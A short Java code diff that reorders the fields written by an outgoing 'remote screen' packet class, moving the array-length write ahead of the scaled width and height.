@@ -22,10 +22,10 @@ public class Packet17RemoteScreen extends AbstractOutgoingPacket {
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		ByteArrayInputStream bais = new ByteArrayInputStream(array);
 		
-		dos.writeInt(scaledWidth);
-		dos.writeInt(scaledHeight);
-		
 		dos.writeInt(array.length);
+		
+		dos.writeInt(scaledWidth);
+		dos.writeInt(scaledHeight);		
 		
 		byte[] chunk = new byte[1024];
 		
